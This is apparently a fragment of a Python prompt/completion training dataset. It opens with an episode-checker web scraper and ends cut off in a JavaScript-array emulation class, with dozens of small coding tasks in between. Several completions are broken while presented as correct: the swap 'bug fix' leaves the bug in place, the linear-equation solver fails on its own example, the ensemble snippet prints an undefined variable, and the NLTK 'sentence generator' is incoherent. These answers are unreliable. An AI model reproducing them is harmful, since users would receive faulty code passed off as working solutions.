terms of the GNU General Public License as published by # the Free Software Foundation, either version 3 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License # along with this program. If not, see <http://www.gnu.org/licenses/>. # import os import os.path import platform import random import re import sys import time if sys.version_info >= (3,): import urllib.request as urllib2 import urllib.parse as urlparse import urllib.error as urlerror else: import urllib2 import urlparse def atoi(text): return int(text) if text.isdigit() else text def natural_keys(text): ''' alist.sort(key=natural_keys) sorts in human order http://nedbatchelder.com/blog/200712/human_sorting.html (See Toothy's implementation in the comments) ''' return [atoi(c) for c in re.split('(d+)', text)] def notify_user(message=None): ''' Notify the user about a particular event with given message ''' if not message: message = 'Notification!!!' #print('-'*len(message)) print('-'*int((len(message)-6)/2), 'NOTIFICATION', '-'*int((len(message)-6)/2)) print(message) def get_page_data(): ''' Get page data as string from server ''' print('Sending request to servers of Colors . . .') full_url = 'http://colors.in.com/in/biggboss' full_url = 'http://colors.in.com/in/biggboss/videos/episodes' # Send request try: #res.geturl(), .url=str, .status=200, .info=200, .msg=OK, response = urllib2.urlopen(full_url) except urlerror.HTTPError as exep: print('The server couldn't fulfill the request.', 'Error code: ', exep.code) except urlerror.URLError as exep: print('We failed to reach a server.') print('Reason: ', exep.reason) else: # everything is fine #if verbose: print('Data received, Decoding . . .') web_page = str(response.read()) # More pythonic than .decode('utf-8') return web_page def get_link(web_page): ''' Get Latest episode link ''' month = time.strftime('%B') new_link_pattern = r'http://colors.in.com/in/biggboss/videos/bigg-boss-8-full-episodedd-' + month.lower() + r'-d+ww-2014.*?.html' #print('Checking: ', new_link_pattern) link_reg = re.findall(new_link_pattern, web_page) if link_reg: #print(link_reg.group()) success_set = sorted(set(link_reg), key=natural_keys) return success_set[-1] def get_episode_list(web_page, new_episode_pattern=None): ''' Get latest episode list from webpage ''' if not new_episode_pattern: # PATTERN used by colors #<li><a title=\\"Bigg Boss 8, Full Episode-8, 29th September, 2014\\" #href=\\"http://colors.in.com/in/biggboss/videos/bigg-boss-8-full-episode8-29th-october-2014-69087-2.html#nav\\"> #http://colors.in.com/in/biggboss/videos/bigg-boss-8-full-episode23-november-14th-2014-10101036-2.html#nav #Bigg Boss 8, Full Episode-8, 29th September, 2014</a></li> #Bigg Boss 8, Full Episode-10, October 1st, 2014</a></li> new_episode_pattern = time.strftime(r'%B-d+ww').lower() month = time.strftime('%B') new_episode_pattern = r'Bigg Boss d+, Full Episode-d+, ' + month + r' d+ww, 2014'; #new_episode_pattern = r'Bigg Boss d+, Full Episode-d+' print('Checking for new episode with pattern:', new_episode_pattern) success = re.findall(new_episode_pattern, web_page) success_set = sorted(set(success), key=natural_keys) return success_set def check_biggboss_episode(new_episode_pattern=None, verbose=False): ''' Check for the latest bigg boss episode ''' web_page = get_page_data() if verbose: print('Page Received:n', web_page) success_set = get_episode_list(web_page, new_episode_pattern) # Parse for success or failure print('Found:') for item in success_set: print('t', item) current_date = int(time.strftime('%d')) current_hour = int(time.strftime('%H')) current_month = time.strftime('%B') if (current_month.lower() in success_set[-1].lower() and ( (str(current_date) in success_set[-1] and (current_hour >= 20)) or (str(current_date-1) in success_set[-1] and (current_hour >= 0 and current_hour < 20)) ) ): msg = 'Found new episode online' notify_user(msg) latest_link = get_link(web_page) if latest_link: print('Here's the link: ', latest_link) else: print('No new episode right now') def main(): ''' Main function - Parse command line arguments ''' from argparse import ArgumentParser parser = ArgumentParser(prog='BiggBoss-checker') parser.add_argument(\\"-p\\", \\"--pattern\\", type=str, dest=\\"pattern\\", help=\\"Search for this pattern instead of default\\") parser.add_argument(\\"-v\\", \\"--verbose\\", dest=\\"verbosity\\", action='store_true', default=False, help='Show verbose output') args = parser.parse_args() # Check input try: check_biggboss_episode(args.pattern, verbose=args.verbosity) except: raise return 0 if __name__ == '__main__': try: main() if os.name == 'nt' or platform.system() == 'Windows': input('Press Enter or Close the window to exit !') except KeyboardInterrupt: print('nClosing garacefully :)', sys.exc_info()[1]) except urlerror.HTTPError: print('HTTP Error:', sys.exc_info()[1]) except SystemExit: pass except: print('Unexpected Error:', sys.exc_info()[0]) print('Details:', sys.exc_info()[1]) raise"},{"prompt":"Generate a python program that accepts two numbers and prints their addition.","completion":"def add(x, y): print(x + y) a = int(input(\\"Enter first number: \\")) b = int(input(\\"Enter second number: \\")) add(a, b)"},{"prompt":"Create a basic script in Python that can automatically sort a list of items by price. items = [ { 'name': 'Sprite', 'price': 1.99 }, { 'name': 'Coca Cola', 'price': 3.99 }, { 'name': 'Pepsi', 'price': 2.99 } ]","completion":"items.sort(key=lambda x: x['price']) print(items) # Output: [{'name': 'Sprite', 'price': 1.99}, {'name': 'Pepsi', 'price': 2.99}, {'name': 'Coca Cola', 'price': 3.99}]"},{"prompt":"Create a Python program to read 2 numbers from the user and calculate their sum. Not applicable","completion":"num1 = int(input(\\"Enter first number: \\")) num2 = int(input(\\"Enter second number: \\")) # Adding two numbers sum = num1 + num2 print(\\"Sum of {0} and {1} is {2}\\" .format(num1, num2, sum))"},{"prompt":"Generate a Python code to multiply all the items of a given list. [2, 3, 4]","completion":"product = 1 for value in [2, 3, 4]: product *= value print(product)"},{"prompt":"Create an artificial neural network in Python using TensorFlow to predict stock prices. Not applicable","completion":"import tensorflow as tf # Create a Neural Network model = tf.keras.Sequential() model.add(tf.keras.layers.Dense(4, input_shape=(len(X[0]),), activation='relu')) model.add(tf.keras.layers.Dense(1)) # Compile model model.compile(optimizer='adam', loss='mean_squared_error', metrics=['accuracy']) # Train model model.fit(X, y, epochs=20) # Make predictions predictions = model.predict(X)"},{"prompt":"Write a function in Python to filter out duplicates from a list. [1,2,3,4,5,1,2,3,4]","completion":"def remove_duplicates(List): return list(set(List))"},{"prompt":"Generate a python program that takes two strings and outputs the longest common substring","completion":"def longestCommonSubstring(s1, s2): m = [[0] * (1 + len(s2)) for i in range(1 + len(s1))] longest, x_longest = 0, 0 for x in range(1, 1 + len(s1)): for y in range(1, 1 + len(s2)): if s1[x - 1] == s2[y - 1]: m[x][y] = m[x - 1][y - 1] + 1 if m[x][y] > longest: longest = m[x][y] x_longest = x else: m[x][y] = 0 return s1[x_longest - longest: x_longest]"},{"prompt":"Create a Python program to generate a report of a user's sales data. A list of dictionaries containing sales data.","completion":"import csv # A list of dictionaries containing sales data sales_data = [ { 'name': 'John', 'quantity': 2, 'price': 10.0 }, { 'name': 'Jane', 'quantity': 3, 'price': 15.0 }, { 'name': 'Mike', 'quantity': 4, 'price':"},{"prompt":"Design a function in Python to generate a random password containing at least one capital letter, one number and one symbol.","completion":"import string import random def generate_password(): \\"\\"\\" This function will generate a random password containing at least one capital letter, one number and one symbol \\"\\"\\" # Create a list of character types char_types = [string.ascii_uppercase, string.ascii_lowercase, string.digits, string.punctuation] # Initialize an empty password passwd = [] # Keep generating characters until we get one of each type while True: # Select a random character type type = random.choice(char_types) # Select a random character from the type char = random.choice(type) # Add the character to the password passwd.append(char) # Check if we have characters from all types if any(c in passwd for c in string.ascii_uppercase) and any(c in passwd for c in string.ascii_lowercase) and any(c in passwd for c in string.digits) and any(c in passwd for c in string.punctuation): break # Shuffle the characters random.shuffle(passwd) # Convert the charaters to a string passwd = ''.join(passwd) return passwd"},{"prompt":"Create a Python code snippet to return the index of a given item from a list. list_of_numbers = [3, 6, 8, 4, 9, 2] item = 6","completion":"item_index = list_of_numbers.index(item) print(item_index) # Prints 1"},{"prompt":"The given code is a Python script that defines functions for converting binary wrd data to a list of commands and vice versa. It also includes some special function definitions for checking flags and waiting for frames. To use these functions, import the necessary modules and call the functions with the appropriate arguments.","completion":"# Copyright © 2012-2013 BlackDragonHunt # # This file is part of the Super Duper Script Editor. # # The Super Duper Script Editor is free software: you can redistribute it # and/or modify it under the terms of the GNU General Public License as # published by the Free Software Foundation, either version 3 of the License, # or (at your option) any later version. # # The Super Duper Script Editor is distributed in the hope that it will be # useful, but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License # along with the Super Duper Script Editor. # If not, see <http://www.gnu.org/licenses/>. import bitstring from bitstring import BitStream, ConstBitStream from wrd.ops import * from wrd.parser import parse_command, InvalidWrdHeader # Converts binary wrd data to a list of commands which can be used in all # the other functions in this module. def from_bin(data): # Eat the header. parse_command(data) commands = [] while True: try: op, params = parse_command(data) commands.append((op, params)) except InvalidWrdHeader: byte = data.read(\\"uint:8\\") commands.append((WRD_INVALID, {\\"val\\": byte})) except: break return commands # Converts a list of commands to the binary format used by the game. def to_bin(commands): data = BitStream() lines = 0 for op, params in commands: if op == WRD_HEADER: continue if not op in OP_PARAMS: # raise Exception(\\"Unknown op: 0x%02X\\" % op) print \\"Unknown op: 0x%02X\\" % op continue param_info = OP_PARAMS[op] # If it has a custom parsing function, use the equivalent packing function. if isinstance(param_info, basestring): command = globals()[OP_FUNCTIONS[op]](**params) data.append(command) else: if op == WRD_SHOW_LINE: lines += 1 data.append(bitstring.pack(\\"uint:8, uint:8\\", CMD_MARKER, op)) unnamed_param_id = 0 for param_name, param_type in param_info: if param_name == None: data.append(bitstring.pack(param_type, params[param_name][unnamed_param_id])) unnamed_param_id += 1 else: data.append(bitstring.pack(param_type, params[param_name])) return bitstring.pack(\\"uint:8, uint:8, uintle:16\\", CMD_MARKER, WRD_HEADER, lines) + data # Special function definitions. def check_flag_a(flags, flag_ops, fail_label): # XX XX 00 YY # * If there are multiple flags (as many as needed) # -> WW XX XX 00 YY # # * When all the flags have been listed. # -> 70 3C 70 34 ZZ ZZ # # * XX XX = Flag group/ID # * YY = Flag State # * 00 = Off # * 01 = On # # * WW = Operator # * 06 = AND # * 07 = OR (?) # # * ZZ ZZ = Label to jump to if check failed. command = bitstring.pack(\\"uint:8, uint:8\\", CMD_MARKER, WRD_CHECKFLAG_A) for i, (flag_group, flag_id, flag_state, long_state) in enumerate(flags): command += bitstring.pack(\\"uint:8, uint:8\\", flag_group, flag_id) if long_state: command += bitstring.pack(\\"uint:16\\", flag_state) else: command += bitstring.pack(\\"uint:8\\", flag_state) if i < len(flag_ops): command += bitstring.pack(\\"uint:8\\", flag_ops[i]) command += bitstring.pack(\\"uint:8, uint:8\\", CMD_MARKER, WRD_FLAG_CHECK_END) if not fail_label == None: command += bitstring.pack(\\"uint:8, uint:8, uint:16\\", CMD_MARKER, WRD_GOTO_LABEL, fail_label) return command def check_flag_b(flags, flag_ops, fail_label): command = bitstring.pack(\\"uint:8, uint:8\\", CMD_MARKER, WRD_CHECKFLAG_B) for i, (unk1, unk2, unk3, unk4, unk5) in enumerate(flags): command += bitstring.pack(\\"uint:8, uint:8, uint:8, uint:8, uint:8\\", unk1, unk2, unk3, unk4, unk5) if i < len(flag_ops): command += bitstring.pack(\\"uint:8\\", flag_ops[i]) command += bitstring.pack(\\"uint:8, uint:8\\", CMD_MARKER, WRD_FLAG_CHECK_END) if not fail_label == None: command += bitstring.pack(\\"uint:8, uint:8, uint:16\\", CMD_MARKER, WRD_GOTO_LABEL, fail_label) return command def wait_frames(frames): return bitstring.pack(\\"uint:8, uint:8\\", CMD_MARKER, WRD_WAIT_FRAME) * frames def byte(val): return bitstring.pack(\\"uint:8\\", val) # EOF #"},{"prompt":"Design a Python program to convert the temperature in Celsius to Fahrenheit. 25.2","completion":"# Program to convert the temperature # from Celsius to Fahrenheit celsius = 25.2 fahrenheit = (celsius * 9/5) + 32 print('%.2f degree Celsius is: %0.2f degree Fahrenheit' %(celsius,fahrenheit)) # Output: 25.20 degree Celsius is: 77.36 degree Fahrenheit"},{"prompt":"Optimize a triple nested Python loop to perform faster. for i in range(n): for j in range(n): for k in range(n): ans += A[i][j] * B[j][k]","completion":"for i in range(n): for k in range(n): temp = 0 for j in range(n): temp += A[i][j] * B[j][k] ans += temp"},{"prompt":"Create a Python program for predicting the weather based on a given set of meteorological data. Humidity: 65%, Temperature: 24°C","completion":"import numpy as np def predict_weather(humidity, temp): humidity = int(humidity.split('%')[0]) temp = int(temp.split('°')[0]) if (humidity < 40 and temp < 10) or (humidity > 80 and temp > 28): return np.random.choice(['rain', 'snow']) elif temp > 25: return 'sunny' else: return 'cloudy' print(predict_weather('65%', '24°C')) # Prints out: cloudy"},{"prompt":"Create a data structure in Python that can store 10 strings of different lengths.","completion":"# Create an empty list to store 10 strings my_list = [] # Loop to prompt user to enter 10 different strings for i in range(10): input_string = input(\\"Enter a string: \\") my_list.append(input_string) print(my_list)"},{"prompt":"Rewrite a given Java class using Python syntax. Java class MyClass with fields x and y: public class MyClass { int x; int y; public MyClass(int x, int y) { this.x = x; this.y = y; } }","completion":"class MyClass: def __init__(self, x, y): self.x = x self.y = y"},{"prompt":"Execute a ensemble machine learning technique in Python to improve the accuracy of a given model. Model: Support Vector Clasificatio","completion":"from sklearn.ensemble import VotingClassifier from sklearn.svm import SVC from sklearn.linear_model import LogisticRegression from sklearn.neighbors import KNeighborsClassifier #Create three classifiers clf1 = SVC(kernel=\\"rbf\\", probability=True, random_state=1234) clf2 = LogisticRegression(random_state=1234) clf3 = KNeighborsClassifier(n_neighbors=4) #Create voting classifier voting_clf = VotingClassifier(estimators=[('svc', clf1), ('lr', clf2), ('knn', clf3)], voting='soft') #Fit the voting classifier voting_clf.fit(x_train, y_train) #Check the accuracy acc = voting_clf.score(x_test, y_test) print('Voting Classifier accuracy:', accuracy)"},{"prompt":"Write a Python program to compare two strings and determine if they are anagrams. string_a = 'stop' string_b = 'pots'","completion":"def is_anagram(string_a, string_b): # Sort characters of both strings str_a_sorted = sorted(string_a) str_b_sorted = sorted(string_b) # Compare the sorted strings if str_a_sorted == str_b_sorted: return True else: return False # Driver code if __name__ == \\"__main__\\": string_a = 'stop' string_b = 'pots' if (is_anagram(string_a, string_b)): print('Yes') else: print('No')"},{"prompt":"Generate a Python class to store employee details. Employee Name: John Doe Employee Number: 001 Designation: Manager Salary: 5000","completion":"class Employee: def __init__(self, name, number, designation, salary): self.name = name self.number = number self.designation = designation self.salary = salary def get_name(self): return self.name def get_number(self): return self.number def get_designation(self): return self.designation def get_salary(self): return self.salary"},{"prompt":"Create Python code to implement the quicksort algorithm. arr = [10, 5, 2, 3, 7]","completion":"def quicksort(arr): # base case for recursion if len(arr) <= 1: return arr # pick pivot element and get its index pivot = arr[0] index = 0 # create left and right lists left = [] right = [] # loop over the array from index 1 for i in range(1, len(arr)): # if element is less than pivot, append to left list if arr[i] < pivot: left.append(arr[i]) # else, append to right list else: right.append(arr[i]) # recursively call function on left and right lists sorted_arr = quicksort(left) + [pivot] + quicksort(right) return sorted_arr result = quicksort(arr) print(result)"},{"prompt":"Create a Python program that takes two strings and returns a new string which contains the common substring between both strings. alexandra, andromeda","completion":"def findCommonSubstring(str1, str2): common_substring = \\"\\" for i in range(len(str1)): for j in range(len(str2)): for k in range(min(len(str1) - i, len(str2) - j)): if str1[i + k] != str2[j + k]: break if k > len(common_substring): common_substring = str1[i:i+k] return common_substring result = findCommonSubstring(\\"alexandra\\", \\"andromeda\\") print(result)"},{"prompt":"Construct a function in Python to reverse the order of the words in a given string. hello world","completion":"def reverse_words(str): words = str.split() reversed_words = words[::-1] reversed_str = ' '.join(reversed_words) return reversed_str result = reverse_words('hello world') print(result)"},{"prompt":"Explain the usage of \`print\` statement in Python.","completion":"The print statement is used to output text or other data to the standard output device in Python. It can be used to print strings, numeric data, objects, or other types of data. For example, you can print a simple string by using the print statement like this: print(\\"Hello World!\\"). You can also print numbers and objects by using the print statement. For example, you can print the results of math operations by using the print statement like this: print(5 * 10). You can also print variables and lists of data using the print statement. For example, you can print a list by using the print statement like this: print(list_of_numbers). The print statement is used to output data to the standard output device and can be used to debug and display results in a readable way."},{"prompt":"Create a program in Python to generate all prime numbers between 2 and n.","completion":"def generate_primes(n): primes = [] for num in range(2, n+1): is_prime = True for i in range(2, num): if num % i == 0: is_prime = False if is_prime: primes.append(num) return primes n = 10 print(generate_primes(n)) # [2, 3, 5, 7]"},{"prompt":"Calculate the sum of the numbers in this list in Python. lst = [3, 5, 8, 9]","completion":"# Calculate the sum of the numbers in the list total = sum(lst) # Print the result print(total) # prints 25"},{"prompt":"Create a function in Python to determine whether a given string contains any whitespace character. Hello World","completion":"def hasWhitespace(string): for c in string: if c.isspace(): return True return False print(hasWhitespace(\\"Hello World\\"))"},{"prompt":"Write a Python code that accepts an input string and returns a list of its capitalized words. python is powerful","completion":"string = \\"python is powerful\\" list_words = string.split() output = [i.capitalize() for i in list_words]"},{"prompt":"Develop a python function to get the last element from a given list","completion":"def get_last_element(list): return list[-1]"},{"prompt":"Generate a program in Python to solve a given linear equation 3x + 5 = 10","completion":"def solve_linear_eq(eq): x, b = eq.split(' ') a, op, constant_term = x.split('x') a = int(a) b = int(b) constant_term = int(constant_term) if op == '+': x = (constant_term - b) / a elif op == '-': x = (b - constant_term) / a return x solution = solve_linear_eq('3x + 5 = 10') print(\\"x = \\" + str(solution))"},{"prompt":"Create a Python program to format a given amount of money with a given currency symbol. Money: 95.50 Currency Symbol: €","completion":"def format_money(amount, symbol): return f\\"{symbol}{amount:.2f}\\" format_money(95.50, '€') # returns €95.50"},{"prompt":"Write a Python function to edit the given input string such that all consecutive duplicate characters in the string are removed. inputstring = aabbcccdddd","completion":"def remove_duplicates(inputstring): result = \\"\\" for i in range(len(inputstring)): if i == 0 or inputstring[i] != inputstring[i-1]: result += inputstring[i] return result"},{"prompt":"Automate a business process by creating a program to generate the output based on specified inputs.","completion":"def automate_business_process(inputs): # Use a programming language such as Python to parse the inputs # ... # Use algorithms to generate the output def generate_output(inputs): ..."},{"prompt":"Create a REST API using Python and Flask for a blog post. This API should provide endpoints to create a new post, update an existing post, delete a post, and list all posts. Not applicable","completion":"from flask import Flask, request from flask_restful import Resource, Api app = Flask(__name__) api = Api(app) # creating the necessary dictionaries to store blog posts blog_posts = {} class BlogPost(Resource): # endpoint to create a blog post def post(self, post_id): post_data = request.get_json() post_title = post_data['title'] post_content = post_data['content'] blog_posts[post_id] = { 'title': post_title, 'content': post_content } return blog_posts[post_id], 201 # endpoint to update a blog post def put(self, post_id): post_data = request.get_json() post_title = post_data['title'] post_content = post_data['content'] blog_posts[post_id]['title'] = post_title blog_posts[post_id]['content'] = post_content return blog_posts[post_id], 200 # endpoint to delete a blog post def delete(self, post_id): del blog_posts[post_id] return 'Post deleted', 200 # endpoint to list all blog posts def get(self): return blog_posts, 200 api.add_resource(BlogPost, '/<string:post_id>') if __name__ == '__main__': app.run(debug = True)"},{"prompt":"it possible to create a function in Python that takes a string as an argument and returns its length?","completion":"def string_length(str): return len(str) string = \\"Hello World\\" length = string_length(string) print(\\"Length of the string is: %d\\" % length)"},{"prompt":"Create a Python class Person, which has the properties first_name, last_name and age.","completion":"class Person: def __init__(self, first_name, last_name, age): self.first_name = first_name self.last_name = last_name self.age = age def full_name(self): return self.first_name + \\" \\" + self.last_name"},{"prompt":"Create a Python program to generate Random Strings with 5 characters","completion":"import random def generate_random_str(): char_set = \\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\\" random_str = ''.join(random.sample(char_set, 5)) return random_str"},{"prompt":"Generate a 3x3 matrix with random integers in Python.","completion":"import random def generate_matrix(length): matrix = [] for _ in range(length): row = [] for _ in range(length): row.append(random.randint(0,100)) matrix.append(row) return matrix print(generate_matrix(3))"},{"prompt":"Create a Python program to rotate a 2dimensional array clockwise. [[1, 2], [3, 4]]","completion":"def rotate_sqr_matrix_clockwise(matrix): N = len(matrix) res = [[0] * N for i in range(N)] for i in range(N): for j in range(N): res[i][j] = matrix[N - 1 - j][i] return res"},{"prompt":"Produce a Python script to remove duplicate values from a list. [1, 2, 3, 2, 1]","completion":"def remove_duplicates(lst): unique_lst = [] for i in lst: if i not in unique_lst: unique_lst.append(i) return unique_lst"},{"prompt":"Given a sorted array of n elements, write a Python program to search for a target element. n = 7 target = 3 sorted_ary = [1, 2, 3, 5, 8, 9, 11]","completion":"def linear_search(sorted_ary, n, target): for i in range(0,n): if sorted_ary[i] == target: return i return -1 result = linear_search(sorted_ary, n, target) if result == -1: print(\\"Element is not present in array\\") else: print(\\"Element is present at index\\", result)"},{"prompt":"Create a Python program to print the numbers in descending order. [10, 3, 5, 8, 7]","completion":"lst = [10, 3, 5, 8, 7] lst.sort(reverse=True) for n in lst: print(n)"},{"prompt":"Create a python function that takes a string as an input, and returns its first letter in capital.","completion":"def capitalize_first_letter(s): if len(s) == 0: return s else: return s[0].upper() + s[1:]"},{"prompt":"Build a convolutional neural network in Python to classify the MNIST dataset.","completion":"import tensorflow as tf from tensorflow.keras.layers import Dense, Flatten, Conv2D, MaxPool2D from tensorflow.keras import Model # Load MNIST dataset (x_train, y_train), (x_test, y_test) = tf.keras.datasets.mnist.load_data() x_train, x_test = x_train / 255.0, x_test / 255.0 # Reshape images to (28, 28, 1) x_train = x_train.reshape(-1, 28, 28, 1) x_test = x_test.reshape(-1, 28, 28, 1) # Build convolutional neural network class CNN(Model): def __init__(self): super(CNN, self).__init__() self.conv1 = Conv2D(32, (3, 3), activation='relu') self.flatten = Flatten() self.d1 = Dense(128, activation='relu') self.d2 = Dense(10, activation='softmax') def call(self, x): x = self.conv1(x) x = self.flatten(x) x = self.d1(x) return self.d2(x) # Build and compile model model = CNN() model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy']) # Train model model.fit(x_train, y_train, epochs=10) # Test model model.evaluate(x_test, y_test)"},{"prompt":"Generate a Python script for computing the sum of the numbers of a given list. nums_list = [1, 3, 5, 7, 9]","completion":"def sum_nums(nums_list): result = 0 for num in nums_list: result += num return result print(sum_nums(nums_list)) # Output 25"},{"prompt":"Convert the following function call from Python to JavaScript. def my_function(a, b): return a + b my_function(3, 4)","completion":"function myFunction(a, b) { return a + b; } myFunction(3, 4);"},{"prompt":"Generate Python code to sum up all numbers up to a given number n","completion":"def sum_to_n(n): #edge cases if n < 0: return 0 if n == 0: return 0 #binominal sum formula return (n * (n+1)) / 2 print(sum_to_n(10))"},{"prompt":"Extend a Python class to create another class with similar behavior. class Vehicle: def __init__(self): self.speed = 0 self.odometer = 0 self.time = 0","completion":"class Motorcycle(Vehicle): def __init__(self): super().__init__() self.num_wheels = 2 self.type = 'motorcycle' def accelerate(self): self.speed += 10 def brake(self): self.speed = max(self.speed - 7, 0)"},{"prompt":"Translate the above Java program into Python program.","completion":"for a in range(1, 26): for b in range(1, 26): for c in range(1, 26): if (a*a + b*b == c*c and a+b+c == 25): print(\\"Pythagorean triplet: \\" + str(a) + \\", \\" + str(b) + \\", \\" + str(c))"},{"prompt":"Fix the bug in this Python code. def swap(a, b): a, b = b, a x = 10 y = 20 swap(x, y) print(x, y)","completion":"def swap(a, b): temp = a a = b b = temp x = 10 y = 20 swap(x, y) print(x, y)"},{"prompt":"Edit the following Python Program to count the occurrences of a specific number. arr = [1, 2, 2, 3, 4] num = 2 count = 0 for i in arr","completion":"arr = [1, 2, 2, 3, 4] num = 2 count = 0 for i in arr: if i == num: count += 1 print(count) #outputs 2"},{"prompt":"Generate a sentence using natural language processing implementations in Python","completion":"text = \\"Computer Science is awesome!\\" from nltk.tokenize import word_tokenize from nltk.stem.wordnet import WordNetLemmatizer from nltk import pos_tag from nltk.corpus import stopwords from nltk.corpus import wordnet as wn lemma = WordNetLemmatizer() # personalized Stopwords and PosTags stopwords = set(stopwords.words('english')) pos_tag = [\\"MD\\", \\"NN\\", \\"VB\\", \\"NNS\\"] word_tokens = word_tokenize(text.lower()) filtered_sentence = [lemma.lemmatize(word) for word in word_tokens if word not in stopwords and pos_tag[0] in pos_tag] print(\\"Generated Text:\\", \\" \\".join(filtered_sentence)) Generated Text: computer science awesome !"},{"prompt":"Generate Python code to print a star pattern.","completion":"for i in range(5): for j in range(i): print ('* ', end=\\"\\") print('') for i in range(5,0,-1): for j in range(i): print('* ', end=\\"\\") print('')"},{"prompt":"Python, write a program that reads in an unsorted array of integers and returns it in sorted order. A = [5, 2, 9, 1, 8]","completion":"def sort_array(A): for i in range(len(A) - 1): min = A[i] min_index = i for j in range(i + 1, len(A)): if A[j] < min: min = A[j] min_index = j if min_index != i: A[i], A[min_index] = A[min_index], A[i] return A"},{"prompt":"Create a Python class to implement a stack that keeps a record of the minimum value at any given time.","completion":"class Stack: def __init__(self): self.items = [] self. minvalue = None def push(self, item): self.items.append(item) if self.minvalue is None or item < self.minvalue: self.minvalue = item def pop(self): item = self.items.pop() if self.minvalue == item: if len(self.items) > 0: self.minvalue = min(self.items) else: self.minvalue = None return item"},{"prompt":"Generate a function in Python to take a list of numbers as input and count the number of elements that are greater than a given number. list = [1, 5, 8, 10, 4], threshold = 7","completion":"def count_greater_than_threshold(list, threshold): count = 0 for num in list: if num > threshold: count += 1 return count print(count_greater_than_threshold(list, threshold)) # Prints 2"},{"prompt":"The given code defines a set of methods for the ArrayPrototype class in JavaScript. To use these methods, create an array object and call the desired method on it. For example, to use the concat method, create an array object and call concat on it, passing in any desired arguments.","completion":"def to_arr(this): \\"\\"\\"Returns Python array from Js array\\"\\"\\" return [this.get(str(e)) for e in xrange(len(this))] ARR_STACK = set({}) class ArrayPrototype: def toString(): # this function is wrong but I will leave it here fore debugging purposes. func = this.get('join') if not func.is_callable(): @this.Js def func(): return '[object %s]'%this.Class return func.call(this, ()) def toLocaleString(): array = this.to_object() arr_len = array.get('length').to_uint32() # separator is simply a comma ',' if not arr_len: return '' res = [] for i in xrange(arr_len): element = array[str(i)] if element.is_undefined() or element.is_null(): res.append('') else: cand = element.to_object() str_func = element.get('toLocaleString') if not str_func.is_callable(): raise this.MakeError('TypeError', 'toLocaleString method of item at index %d is not callable'%i) res.append(element.callprop('toLocaleString').value) return ','.join(res) def concat(): array = this.to_object() A = this.Js([]) items = [array] items.extend(to_arr(arguments)) n = 0 for E in items: if E.Class=='Array': k = 0 e_len = len(E) while k<e_len: if E.has_property(str(k)): A.put(str(n), E.get(str(k))) n+=1 k+=1 else: A.put(str(n), E) n+=1 return A def join(separator): ARR_STACK.add(this) array = this.to_object() arr_len = array.get('length').to_uint32() separator = ',' if separator.is_undefined() else separator.to_string().value elems = [] for e in xrange(arr_len): elem = array.get(str(e)) if elem in ARR_STACK: s = '' else: s = elem.to_string().value elems.append(s if not (elem.is_undefined() or elem.is_null()) else '') res = separator.join(elems) ARR_STACK.remove(this) return res def pop(): #todo check array = this.to_object() arr_len = array.get('length').to_uint32() if not arr_len: array.put('length', this.Js(arr_len)) return None ind = str(arr_len-1) element = array.get(ind) array.delete(ind) array.put('length', this.Js(arr_len-1)) return element def push(item): # todo check array = this.to_object() arr_len = array.get('length').to_uint32() to_put = arguments.to_list() i = arr_len for i, e in enumerate(to_put, arr_len): array.put(str(i), e) if to_put: i+=1 array.put('length', this.Js(i)) return i def reverse(): array = this.to_object() # my own algorithm vals = to_arr(array) has_props = [array.has_property(str(e)) for e in xrange(len(array))] vals.reverse() has_props.reverse() for i, val in enumerate(vals): if has_props[i]: array.put(str(i), val) else: array.delete(str(i)) return array def shift(): #todo check array = this.to_object() arr_len = array.get('length').to_uint32() if not arr_len: array.put('length', this.Js(0)) return None first = array.get('0') for k in xrange(1, arr_len): from_s, to_s = str(k), str(k-1) if array.has_property(from_s): array.put(to_s, array.get(from_s)) else: array.delete(to) array.delete(str(arr_len-1)) array.put('length', this.Js(str(arr_len-1))) return first def slice(start, end): # todo check array = this.to_object() arr_len = array.get('length').to_uint32() relative_start = start.to_int() k = max((arr_len + relative_start), 0) if relative_start<0 else min(relative_start, arr_len) relative_end = arr_len if end.is_undefined() else end.to_int() final = max((arr_len + relative_end), 0) if relative_end<0 else min(relative_end, arr_len) res = [] n = 0 while k<final: pk = str(k) if array.has_property(pk): res.append(array.get(pk)) k += 1 n += 1 return res def sort(cmpfn): if not this.Class in {'Array', 'Arguments'}: return this.to_object() # do nothing arr = [this.get(str(i)) for i in xrange(len(this))] if not arr: return this if not cmpfn.is_callable(): cmpfn = None cmp = lambda a,b: sort_compare(a, b, cmpfn) arr.sort(cmp=cmp) for i in xrange(len(arr)): this.put(unicode(i), arr[i]) return this def splice(start, deleteCount): # 1-8 array = this.to_object() arr_len = array.get('length').to_uint32() relative_start = start.to_int() actual_start = max((arr_len + relative_start),0) if relative_start<0 else min(relative_start, arr_len) actual_delete_count = min(max(deleteCount.to_int(),0 ), arr_len - actual_start) k = 0 A = this.Js([]) # 9 while k<actual_delete_count: if array.has_property(str(actual_start+k)): A.put(str(k), array.get(str(actual_start+k))) k += 1 # 10-11 items = to_arr(arguments)[2:] items_len = len(items) # 12 if items_len<actual_delete_count: k = actual_start while k < (arr_len-actual_delete_count): fr = str(k+actual_delete_count) to = str(k+items_len) if array.has_property(fr): array.put(to, array.get(fr)) else: array.delete(to) k += 1 k = arr_len while k > (arr_len - actual_delete_count + items_len): array.delete(str(k-1)) k -= 1 # 13 elif items_len>actual_delete_count: k = arr_len - actual_delete_count while k>actual_start: fr = str(k + actual_delete_count - 1) to = str(k + items_len - 1) if array.has_property(fr): array.put(to, array.get(fr)) else: array.delete(to) k -= 1 # 14-17 k = actual_start while items: E = items.pop(0) array.put(str(k), E) k += 1 array.put('length', this.Js(arr_len - actual_delete_count + items_len)) return A def unshift(): array = this.to_object() arr_len = array.get('length').to_uint32() argCount = len(arguments) k = arr_len while k > 0: fr = str(k - 1) to = str(k + argCount - 1) if array.has_property(fr): array.put(to, array.get(fr)) else: array.delete(to) k -= 1 j = 0 items = to_arr(arguments) while items: E = items.pop(0) array.put(str(j), E) j += 1 array.put('length', this.Js(arr_len + argCount)) return arr_len + 